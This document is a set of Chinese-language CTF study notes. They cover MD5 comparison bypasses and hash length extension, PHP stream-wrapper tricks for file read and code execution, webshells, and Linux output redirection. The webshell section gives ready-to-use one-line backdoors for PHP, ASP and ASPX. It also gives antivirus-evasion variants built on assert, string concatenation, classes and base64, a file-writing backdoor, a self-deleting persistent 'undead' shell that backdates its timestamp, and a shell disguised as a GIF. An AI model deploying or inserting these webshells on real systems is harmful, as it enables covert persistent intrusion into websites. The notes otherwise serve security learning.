强抗碰撞：已知原数据和其MD5值，想找到一个具有相同MD5值的数据（即伪造数据）是非常困难的。
```

#### 2、md5的算法原理
对MD5算法简要的叙述可以为：MD5以512位分组来处理输入的信息，且每一分组又被划分为16个32位子分组，经过了一系列的处理后，算法的输出由四个32位分组组成，将这四个32位分组级联后将生成一个128位散列值。



总体流程如下图所示， 表示第i个分组，每次的运算都由前一轮的128位结果值和第i块512bit值进行运算。

![](https://cdn.nlark.com/yuque/0/2024/png/49235244/1731637620049-36843ded-0c3c-41e5-9ecf-0705cdd821e8.png)

#### 3、md5在ctf比赛中可利用的方法
##### 在php中的弱相等和强相等的绕过
###### 弱相等：
当遇到弱相等时 可利用0e绕过和数组绕过

例如

```php
0e123==0e456  //由于在php被认为时科学计数法所以二者都等于0
banana[]==apple[] //由于数组在转化时都成null所以两者相等
```

当遇到string且弱相等时 数组绕过就不能使用只能使用0e绕过！！！

###### 强相等：
当遇到强相等时 常见的绕过方式是数组绕过

例如

```php
banana[]===apple[] //由于数组在转化时都成null所以两者相等
```

当遇到string且强相等时 数组绕过不能使用 但是由于md5值具有不唯一性

可能两个不同的字符串会有相同的md5值 所以我们可通过md5碰撞来绕过

例如

```php
banana=TEXTCOLLBYfGiJUETHQ4hAcKSMd5zYpgqf1YRDhkmxHkhPWptrkoyz28wnI9V0aHeAuaKnak
apple= TEXTCOLLBYfGiJUETHQ4hEcKSMd5zYpgqf1YRDhkmxHkhPWptrkoyz28wnI9V0aHeAuaKnak
md5((string)$apple) === md5((string)$banana))
```

找到真实的 MD5 值一致的内容, 我们可以使用 fastcoll 工具

[链接](https://www.win.tue.nl/hashclash/fastcoll_v1.0.0.5.exe.zip)

##### md5绕过常用
以0e开头后面是数字的字符串 并且md5值也为0e开头后面是数字

```php
Plaintext	    MD5 Hash
0e215962017	  0e291242476940776845150308577824
0e1284838308	0e708279691820928818722257405159
0e1137126905	0e291659922323405260514745084877
0e807097110	  0e318093639164485566453180786895
0e730083352	  0e870635875304277170259950255928
```

md5值为0e的字符串

```php
QNKCDZO
240610708
s878926199a
s155964671a
s214587387a
0e215962017
```

MD5值一样的不同字符串

```php
banana=TEXTCOLLBYfGiJUETHQ4hAcKSMd5zYpgqf1YRDhkmxHkhPWptrkoyz28wnI9V0aHeAuaKnak
apple= TEXTCOLLBYfGiJUETHQ4hEcKSMd5zYpgqf1YRDhkmxHkhPWptrkoyz28wnI9V0aHeAuaKnak
       s878926199a
       s155964671a
md5((string)$apple) === md5((string)$banana))
```

##### 哈希长度拓展攻击
###### 什么是哈希长度拓展攻击
<font style="color:rgb(77, 77, 77);">哈希长度扩展攻击(hash lengthextensionattacks)是指针对某些允许包含额外信息的加密散列函数的攻击手段。次攻击适用于MD5和SHA-1等基于Merkle–Damgård构造的算法</font>

###### <font style="color:rgb(79, 79, 79);">MD5扩展攻击介绍</font>
![](https://cdn.nlark.com/yuque/0/2024/jpeg/49235244/1731648567225-87360a1b-2db2-46e1-ba55-b197d78c7428.jpeg)

<font style="color:rgb(77, 77, 77);">我们需要了解以下几点md5加密过程：</font>

<font style="color:rgb(85, 86, 102);">1、MD5加密过程中512比特（64字节）为一组，属于分组加密，而且在运算的过程中，将512比特分为32bit*16块，分块运算</font>

<font style="color:rgb(85, 86, 102);">2、关键利用的是MD5的填充，对加密的字符串进行填充(比特第一位为1其余比特为0)，使之(二进制)补到448模512同余，即长度为512的倍数减64，最后的64位在补充为原来字符串的长度，这样刚好补满512位的倍数，如果当前明文正好是512bit倍数则再加上一个512bit的一组。</font>

<font style="color:rgb(85, 86, 102);">3、MD5不管怎么加密，每一块加密得到的密文作为下一次加密的初始向量</font><font style="color:rgb(85, 86, 102);">。</font>

<font style="color:rgb(77, 77, 77);">举一个例子讲一下如何填充：比如字符串“Acker” </font><font style="color:rgb(78, 161, 219) !important;">十六进制</font><font style="color:rgb(77, 77, 77);">0x41636b6572这里与448模512不同余，需补位满足二进制长度位512的倍数，补位后的数据如下：</font>

```php
0x61646d696e8000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000002800000000000000
```

<font style="color:rgb(77, 77, 77);">此处补充：以十六进制表示一共是128个字符，十六进制每个字符能够转换成4位二进制，128*4=512这就是一组，正好是512bit</font><font style="color:rgb(77, 77, 77);">。</font>

![](https://cdn.nlark.com/yuque/0/2024/jpeg/49235244/1731648728768-3334b5f2-efcb-4544-9e74-1285ec7f2201.jpeg)

<font style="color:rgb(77, 77, 77);">上图中的8是因为补位时二进制第一位要补1，那么1000转换成16进制就是8.后面都补上0.</font>

![](https://cdn.nlark.com/yuque/0/2024/jpeg/49235244/1731648747002-fe3bb4a2-74af-4142-8ad1-2e323ca3fcfc.jpeg)

<font style="color:rgb(77, 77, 77);">填充数据最后8字节长度，Acker长度为5*8=40bit，又因为0x28=40所以16进制显示为28.</font>

<font style="color:rgb(77, 77, 77);">为什么数据会在左端：MD5中储存的都是小端方式，比如0x12345678，那么md5存储顺序就是0x78563412</font>

###### <font style="color:rgb(79, 79, 79);">MD5拓展攻击演示</font>
<font style="color:rgb(77, 77, 77);">下图为加密流程图，可以更直观看清楚整个流程。</font>

![](https://cdn.nlark.com/yuque/0/2024/jpeg/49235244/1731648811483-3d320796-f89a-46a5-99dc-d043f32dfba5.jpeg)

<font style="color:rgb(77, 77, 77);">选一个字符串例如“Acker”MD5（“Acker”）= dee2fb2df156f4040f893d8a10ac1034</font>

<font style="color:rgb(77, 77, 77);">现在我们不需要知道字符串是什么。只需要知道其长度，并将字符串填充完，新加一个字符串如：addition，之前得到的“Acker”MD5值作为最后一块加密的初始向量，最后得到的结果和MD5（“Acker+addition”）是一样的。</font>

<font style="color:rgb(77, 77, 77);">题目中的md5=md5(random+name)也是同样的原理</font>

### 关于PHP常见伪协议的使用
<font style="color:rgb(77, 77, 77);">php支持的伪协议有：</font>

```plain
1 file:// — 访问本地文件系统
2 http:// — 访问 HTTP(s) 网址
3 ftp:// — 访问 FTP(s) URLs
4 php:// — 访问各个输入/输出流（I/O streams）
5 zlib:// — 压缩流
6 data:// — 数据（RFC 2397）
7 glob:// — 查找匹配的文件路径模式
8 phar:// — PHP 归档
9 ssh2:// — Secure Shell 2
10 rar:// — RAR
11 ogg:// — 音频流
12 expect:// — 处理交互式的流
```

这里只介绍几种常见伪协议的用法

#### 1、php://filter
**<font style="color:rgb(77, 77, 77);">php://filter</font>**<font style="color:rgb(77, 77, 77);"> 是一种元封装器， 设计用于数据流打开时的筛选过滤应用。 这对于一体式（all-in-one）的文件函数非常有用，类似 readfile()、 file() 和 file_get_contents()， 在数据流内容读取之前没有机会应用其他过滤器。</font>

<font style="color:rgb(77, 77, 77);">简单通俗的说，这是一个中间件，在读入或写入数据的时候对数据进行处理后输出的一个过程。</font>

**<font style="color:rgb(77, 77, 77);">php://filter</font>**<font style="color:rgb(77, 77, 77);">可以获取指定文件源码。当它与包含函数结合时，</font>**<font style="color:rgb(77, 77, 77);">php://filter</font>**<font style="color:rgb(77, 77, 77);">流会被当作php文件执行。所以我们一般对其进行编码，让其不执行。从而导致任意文件读取。</font>

<font style="color:rgb(77, 77, 77);">协议参数</font>

| 名称 | 描述 |
| --- | --- |
| resource=<要过滤的数据流> | <font style="color:rgb(79, 79, 79);">这个参数是必须的。它指定了你要筛选过滤的数据流。</font> |
| read=<读链的筛选列表> | 该参数可选。可以设定一个或多个过滤器名称，以管道符（|）分隔。 |
| write=<写链的筛选列表> | 该参数可选。可以设定一个或多个过滤器名称，以管道符（|）分隔。 |
| <；两个链的筛选列表> | 任何没有以 read= 或 write= 作前缀 的筛选器列表会视情况应用于读或写链。 |


<font style="color:rgb(77, 77, 77);">常用：</font>

```plain
php://filter/read=convert.base64-encode/resource=index.php
php://filter/resource=index.php
```

<font style="color:rgb(77, 77, 77);">利用filter协议读文件，将index.php通过</font><font style="color:rgb(78, 161, 219) !important;">base64</font><font style="color:rgb(77, 77, 77);">编码后进行输出。这样做的好处就是如果不进行编码，文件包含后就不会有输出结果，而是当做php文件执行了，而通过编码后则可以读取文件源码。使用的convert.base64-encode，就是一种过滤器。</font>

##### <font style="color:rgb(77, 77, 77);">利用filter伪协议绕过exit</font>
###### <font style="color:rgb(77, 77, 77);">什么是exit</font>
<font style="color:rgb(77, 77, 77);">exit指的是在进行写入PHP文件操作时，执行了以下函数：</font>

```plain
file_put_contents($content, '<?php exit();' . $content);
```

<font style="color:rgb(77, 77, 77);">亦或者</font>

```plain
file_put_contents($content, '<?php exit();?>' . $content);
```

<font style="color:rgb(77, 77, 77);">这样，当你插入一句话木马时，文件的内容是这样子的：</font>

```plain
<?php exit();?>

<?php @eval($_POST['snakin']);?>
```

<font style="color:rgb(77, 77, 77);">这样即使插入了一句话木马，在被使用的时候也无法被执行。这样的死亡exit通常存在于缓存、配置文件等等不允许用户直接访问的文件当中。</font>

###### <font style="color:rgb(77, 77, 77);">base64decode绕过</font>
<font style="color:rgb(77, 77, 77);">利用filter协议来绕过，看下这样的代码：</font>

```plain
<?php

$content = '<?php exit; ?>';

$content .= $_POST['txt'];

file_put_contents($_POST['filename'], $content);
```

<font style="color:#000000;">当用户通过POST方式提交一个数据时，会与死亡exit进行拼接，从而避免提交的数据被执行。</font>

<font style="color:#000000;">然而这里可以利用php://filter的base64-decode方法，将$content解码，利用php base64_decode函数特性去除exit。</font>

<font style="color:rgb(77, 77, 77);">base64编码中只包含64个可打印字符，当PHP遇到不可解码的字符时，会选择性的跳过，这个时候base64就相当于以下的过程：</font>

```plain
<?php

$_GET['txt'] = preg_replace('|[^a-z0-9A-Z+/]|s', '', $_GET['txt']);

base64_decode($_GET['txt']);
```

<font style="color:rgb(77, 77, 77);">所以，当</font><font style="color:#601BDE;">$content</font><font style="color:#000000;">包含</font><font style="color:#601BDE;"><?php exit;?></font><font style="color:rgb(77, 77, 77);">时，解码过程会先去除识别不了的字符，< ; ? >和空格等都将被去除，于是剩下的字符就只有</font><font style="color:#601BDE;">phpexit</font><font style="color:rgb(77, 77, 77);">以及我们传入的字符了。由于base64是4个byte一组，再添加一个字符例如添加字符'a'后，将’phpexita’当做两组base64进行解码，也就绕过这个死亡exit了。</font>

<font style="color:rgb(77, 77, 77);">这个时候后面再加上编码后的一句话木马，就可以getshell了。</font>

###### <font style="color:rgb(79, 79, 79);">strip_tags绕过</font>
<font style="color:rgb(77, 77, 77);">这个</font><font style="color:#601BDE;"><?php exit;?></font><font style="color:rgb(77, 77, 77);">实际上是一个XML标签，既然是XML标签，我们就可以利用strip_tags函数去除它，而php://filter刚好是支持这个方法的。</font>

<font style="color:rgb(77, 77, 77);">但是我们要写入的一句话木马也是XML标签，在用到strip_tags时也会被去除。</font>

<font style="color:rgb(77, 77, 77);">注意到在写入文件的时候，filter是支持多个过滤器的。可以先将webshell经过base64编码，strip_tags去除死亡exit之后，再通过base64-decode复原。</font>

```plain
php://filter/string.strip_tags|convert.base64-decode/resource=shell.php
```

<font style="color:rgb(77, 77, 77);">更多绕过方法：</font>[file_put_content和死亡·杂糅代码之缘 - 先知社区](https://xz.aliyun.com/t/8163?time__1311=n4%2BxnD0Dc7GQ0%3DDCDgADlhjm57ITj2GD0I2q%3Dx#toc-2)

#### <font style="color:rgb(79, 79, 79);">2、data://</font>
<font style="color:rgb(77, 77, 77);">数据流封装器，以传递相应格式的数据。可以让用户来控制输入流，当它与包含函数结合时，用户输入的data://流会被当作php文件执行。</font>

<font style="color:rgb(77, 77, 77);">示例用法</font>

```plain
1、data://text/plain,
http://127.0.0.1/include.php?file=data://text/plain,<?php%20phpinfo();?>
 
2、data://text/plain;base64,
http://127.0.0.1/include.php?file=data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8%2b

```

除GET方法外POST同样也可以

例如题目中的

![](https://cdn.nlark.com/yuque/0/2024/png/49235244/1731479347348-42b6ae4a-fcea-48f6-a95e-b3b86b46d84e.png?x-oss-process=image%2Fformat%2Cwebp%2Fresize%2Cw_1125%2Climit_0)

#### 3、file://
<font style="color:rgb(77, 77, 77);">用于访问本地文件系统，并且不受allow_url_fopen，allow_url_include影响</font>  
<font style="color:rgb(77, 77, 77);">file://协议主要用于访问文件(绝对路径、相对路径以及网络路径)</font>  
<font style="color:rgb(77, 77, 77);">比如：http://www.xx.com?file=file:///etc/passsword</font>

#### <font style="color:rgb(77, 77, 77);">4、php://</font>
<font style="color:rgb(77, 77, 77);">在allow_url_fopen，allow_url_include都关闭的情况下可以正常使用</font>  
<font style="color:rgb(77, 77, 77);">php://作用为访问输入输出流</font>

#### <font style="color:rgb(77, 77, 77);">5、php://input</font>
**<font style="color:rgb(77, 77, 77);">php://input</font>**<font style="color:rgb(77, 77, 77);">可以访问请求的原始数据的只读流，将post请求的数据当作php代码执行。当传入的参数作为文件名打开时，可以将参数设为php://input,同时post想设置的文件内容，php执行时会将post内容当作文件内容。从而导致任意代码执行。</font>

<font style="color:rgb(77, 77, 77);">例如：</font>

[http://127.0.0.1/cmd.php?cmd=php://input](http://127.0.0.1/cmd.php?cmd=php://input)

<font style="color:rgb(77, 77, 77);">POST数据：<?php phpinfo()?></font>

<font style="color:rgb(77, 77, 77);">注意：</font>

<font style="color:rgb(77, 77, 77);">当enctype="multipart/form-data"的时候 php://input` 是无效的</font>

<font style="color:rgb(77, 77, 77);">遇到file_get_contents()要想到用php://input绕过</font>

#### <font style="color:rgb(79, 79, 79);">6 zip://</font>
<font style="color:rgb(77, 77, 77);">zip:// 可以访问压缩包里面的文件。当它与包含函数结合时，zip://流会被当作php文件执行。从而实现任意代码执行。</font>

```plain
zip://中只能传入绝对路径。
要用#分隔压缩包和压缩包里的内容，并且#要用url编码%23（即下述POC中#要用%23替换）
只需要是zip的压缩包即可，后缀名可以任意更改。
相同的类型的还有zlib://和bzip2://
```

![](https://cdn.nlark.com/yuque/0/2024/png/49235244/1731483456000-93f8731c-4a4f-4866-9998-a2419b397385.png)

本文参考链接[链接](https://blog.csdn.net/cosmoslin/article/details/120695429?ops_request_misc=%257B%2522request%255Fid%2522%253A%252228579CCC-1D95-4F8C-AEA8-738D2D0C590C%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&request_id=28579CCC-1D95-4F8C-AEA8-738D2D0C590C&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~top_positive~default-1-120695429-null-null.142^v100^pc_search_result_base7&utm_term=php%E4%BC%AA%E5%8D%8F%E8%AE%AE&spm=1018.2226.3001.4187)

### 一句话木马
主要参考文章：[链接](https://blog.csdn.net/weixin_39190897/article/details/86772765?ops_request_misc=%257B%2522request%255Fid%2522%253A%252209B31737-A115-41DD-BFCA-63527FE4A2BF%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&request_id=09B31737-A115-41DD-BFCA-63527FE4A2BF&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~top_positive~default-1-86772765-null-null.142^v100^pc_search_result_base7&utm_term=%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%ACphp%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0&spm=1018.2226.3001.4187)

#### <font style="color:rgb(79, 79, 79);">概述：</font>
<font style="color:rgb(77, 77, 77);">在很多的渗透过程中，渗透人员会上传一句话木马（</font>**<font style="color:rgb(77, 77, 77);">简称Webshell</font>**<font style="color:rgb(77, 77, 77);">）到目前web服务目录继而提权获取系统权限，不论asp、php、jsp、aspx都是如此</font>

<font style="color:rgb(77, 77, 77);">先来看看最简单的一句话木马：</font>

```plain
   <?php @eval($_POST['attack']);?>
```

【基本原理】利用文件上传漏洞，往目标网站中上传一句话木马，然后你就可以在本地通过中国菜刀或中国蚁剑即可获取和控制整个网站目录。@表示后面即使执行错误，也不报错。eval（）函数表示括号内的语句字符串什么的全都当做代码执行。$_POST['attack']表示从页面中获得attack这个参数值。

#### <font style="color:rgb(79, 79, 79);">入侵条件：</font>
<font style="color:rgb(77, 77, 77);">其中，只要攻击者满足三个条件，就能实现成功入侵：</font>

```plain
木马上传成功，未被杀；
知道木马的路径在哪；
上传的木马能正常运行。
```

#### <font style="color:rgb(79, 79, 79);">常见形式：</font>
<font style="color:rgb(77, 77, 77);">常见的一句话木马：</font>

```plain
php的一句话木马： <?php @eval($_POST['pass']);  
asp的一句话是：   <%eval request ("pass")%>
aspx的一句话是：  <%@ Page Language="Jscript"%> <%eval(Request.Item["pass"],"unsafe");%>
```

<font style="color:rgb(77, 77, 77);">我们可以直接将这些语句插入到网站上的某个asp/aspx/php文件上，或者直接创建一个新的文件，在里面写入这些语句，然后把文件上传到网站上即可。</font>

#### <font style="color:rgb(79, 79, 79);">基本原理：</font>
<font style="color:rgb(77, 77, 77);">首先我们先看一个原始而又简单的php一句话木马：</font>

```plain
   <?php @eval($_POST['cmd']); ?>
```

<font style="color:rgb(77, 77, 77);">这是php的一句话后门中最普遍的一种。它的工作原理是：</font>  
<font style="color:rgb(77, 77, 77);">首先存在一个名为'cmd'的变量，'cmd'的取值为HTTP的POST方式。Web服务器对'cmd'取值以后，然后通过eval()函数执行'cmd'里面的内容。</font>

#### <font style="color:rgb(79, 79, 79);">一句话木马简单免杀</font>
<font style="color:rgb(77, 77, 77);">从上面的演示中可以看到一句话木马的简单、高效，但就是因为其过于简单，查杀起来也很方便，所以要对其进行变形，让它不容易被发现。以下是几个免杀方法：</font>

##### <font style="color:rgb(77, 77, 77);">一、assert()</font>
如果过滤了eval可以使用assert绕过

<font style="color:rgb(85, 86, 102);background-color:rgb(238, 240, 244);">assert() 会检查指定的 assertion 并在结果为true时执行</font>

```php
<?php @assert($_POST['cmd']); ?>
```

##### 二、字符串拼接
当过滤了<font style="color:#601BDE;">eval assert</font><font style="color:#000000;">两个关键字时，我们可以使用字符串拼接的方式 </font><font style="color:rgb(77, 77, 77);">介绍substr_replace()函数</font>

```php
substr_replace(string,replacement,start,length)
```

|  参数 | 描述 |
| --- | --- |
| <font style="color:rgb(79, 79, 79);">string</font> | <font style="color:rgb(79, 79, 79);">必需，规定检查的字符串。</font> |
| <font style="color:rgb(79, 79, 79);background-color:rgb(247, 247, 247);">replacement</font> | <font style="color:rgb(79, 79, 79);background-color:rgb(247, 247, 247);">必需，规定要插入的字符串。</font> |
| start | <font style="color:rgb(79, 79, 79);">必需，规定在字符串的何处开始替换。若为0，从头开始。</font> |
| length | <font style="color:rgb(79, 79, 79);background-color:rgb(247, 247, 247);">可选。规定要替换多少个字符。默认是与字符串长度相同。</font> |


```php
<?php
	$a=substr_replace("assexx","rt",4);
	@$a($_POST['cmd']);
?>
```

<font style="color:rgb(77, 77, 77);">在这个马中，是将第四位和第五位，也就是</font>`<font style="color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);">xx</font>`<font style="color:rgb(77, 77, 77);">替换成</font>`<font style="color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);">rt</font>`<font style="color:rgb(77, 77, 77);">，最终拼接成为</font>`<font style="color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);">assert</font>`

<font style="color:rgb(77, 77, 77);">除了substr_replace()，还有一种拼接方法</font>

```php
<?php
	$a="a"."s";
	$b="s"."e"."rt";
	$c=$a.$b;
	$c($_POST['cmd']);
?>
```

##### 三、函数
可以利用函数来构造一句话木马

```php
<?php
	function shyshy($a){
	assert($a);
	}
	@shyshy($_POST['cmd']);
?>
```

先是构造了shyshy()这一函数 然后调用这一函数 变成一句话木马

##### 四、request请求
适用于过滤了get和post请求的的条件

```php
<?php
	$a=$_REQUEST['cmd'];
	$b="\n";
	eval($b.=$a);
?>
```

##### 五、类
可以构造一个类，利用魔术方法来拼接

```php
<?php
	class shyshy{
		public $a='';
		function __destruct(){
			assert("this->$a");
			}
		}
		$b=new shyshy();
		$b->a=$_POST['cmd'];
?>
```

##### 六、base64加解密
```php
<?php
	$a=base_decode(YXNzZXJ0);
	$b=$a(base64_decode($_POST['cmd']));
?>
```

##### 七、写入木马
```php
<?php
	if(isset($_POST['filename']))
	{
		$d='data';
		$$d=$_POST['text'];  //$data
		$f='fp';
		$$f=fopen($_POST['filename'],'wb');  //$fp
		echo fwrite($fp,$data):"save success":"save fail";
		fclose($fp);
	}
?>
```

<font style="color:rgb(77, 77, 77);">这个代码通过在网站根目录下写一句话木马的方法，然后再去访问木马，从而getshell。</font>

##### <font style="color:rgb(77, 77, 77);">八、不死马</font>
```php
<?php
	ignore_user_abort(true);  //设置与客户机断开是否会终止脚本的执行，true则不会
	set_time_limit(0);  //如果为零说明永久执行直到程序结束
	unlink(__FILE__);  //调用unlink()的时候，文件还是存在的，只是目录里找不到该文件了，但是已经打开这个文件的进程可以正常读写
	$file='./.index1.php';
	$code='<?php
		if(md5($_POST["pass"])=="xxxxxxxxxx")  //给木马设置密码，防止他人使用
		{
			@eval($_POST["cmd"]);
		}?>';  
	while(1){
		file_put_contents($file,$code);
		system('touch -m -d "2018-12-01 9:10:12" .index1.php');  //设置文件的编辑时间
	usleep(5000);
	}
?>
```

<font style="color:rgb(77, 77, 77);">实测时发现设置文件编辑时间那里会报错，可以选择把那一句删掉。</font>  
<font style="color:rgb(77, 77, 77);">用法：</font>`<font style="color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);">?pass=shyshy&cmd=phpinfo();</font>`

##### 九、修改头文件
```plain
GIF89a
<script language="php">eval($_POST['shell']);</script> 
```

什么是GIF89a

    一个GIF89a图形文件就是一个根据图形交换格式（GIF）89a版（1989年7 月发行）进行格式化之后的图形。在GIF89a之前还有87a版（1987年5月发行），但在Web上所见到的大多数图形都是以89a版的格式创建的。 89a版的一个最主要的优势就是可以创建动态图像，例如创建一个旋转的图标、用一只手挥动的旗帜或是变大的字母。特别值得注意的是，一个动态GIF是一个 以GIF89a格式存储的文件，在一个这样的文件里包含的是一组以指定顺序呈现的图片。

#### 关于linux常用命令——重定向
参考文章[链接](https://blog.csdn.net/shanliangliuxing/article/details/8799153?ops_request_misc=&request_id=&biz_id=102&utm_term=%E9%87%8D%E5%AE%9A%E5%90%91%E5%88%B0%E6%96%87%E4%BB%B6&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduweb~default-2-8799153.142^v100^control&spm=1018.2226.3001.4187)

重定向能够实现Linux命令的输入输出与文件之间重定向，以及实现将多个命令组合起来实现更加强大的命令。这部分涉及到的比较多的命令主要有：

```php
    cat：连接文件
    sort：排序文本行
    uniq：忽略或者报告重复行
    wc：统计文件的行数、词数、字节数
    grep：打印匹配制定模式的行
    head：输出文件的头部
    tail：输出文件的尾部
    tee：从标准输入读，并往标准输出或者文件写
```

##### 1、重定向符号
```php
>               输出重定向到一个文件或设备 覆盖原来的文件
>!              输出重定向到一个文件或设备 强制覆盖原来的文件
>>             输出重定向到一个文件或设备 追加原来的文件
<               输入重定向到一个程序 
```

##### 2、标准错误重定向符号
```php
2>             将一个标准错误输出重定向到一个文件或设备 覆盖原来的文件  b-shell
2>>           将一个标准错误输出重定向到一个文件或设备 追加到原来的文件
2>&1         将一个标准错误输出重定向到标准输出 注释:1 可能就是代表 标准输出
>&             将一个标准错误输出重定向到一个文件或设备 覆盖原来的文件  c-shell
|&              将一个标准错误 管道 输送 到另一个命令作为输入
```

#####   
  3、命令重导向示例
```php
在 bash 命令执行的过程中，主要有三种输出入的状况，分别是：
1. 标准输入；代码为 0 ；或称为 stdin ；使用的方式为 <
2. 标准输出：代码为 1 ；或称为 stdout；使用的方式为 1>
3. 错误输出：代码为 2 ；或称为 stderr；使用的方式为 2>

test @test test]# ls -al > list.txt
将显示的结果输出到 list.txt 文件中，若该文件以存在则予以取代！

[test @test test]# ls -al >> list.txt
将显示的结果累加到 list.txt 文件中，该文件为累加的，旧数据保留！

[test @test test]# ls -al  1> list.txt   2> list.err
将显示的数据，正确的输出到 list.txt 错误的数据输出到 list.err

[test @test test]# ls -al 1> list.txt 2> &1
将显示的数据，不论正确或错误均输出到 list.txt 当中！
错误与正确文件输出到同一个文件中，则必须以上面的方法来写！不能写成其它格式！

test @test test]# ls -al 1> list.txt 2> /dev/null
将显示的数据，正确的输出到 list.txt 错误的数据则予以丢弃！
/dev/null ，可以说成是黑洞装置。为空，即不保存。

```

##### 4、为何要使用命令输出重导向
```php
当屏幕输出的信息很重要，而且我们需要将他存下来的时候；
背景执行中的程序，不希望他干扰屏幕正常的输出结果时；
一些系统的例行命令（例如写在 /etc/crontab 中的文件）的执行结果，希望他可以存下来时；
一些执行命令，我们已经知道他可能的错误讯息，所以想以『 2> /dev/null 』将他丢掉时；
错误讯息与正确讯息需要分别输出时。
```

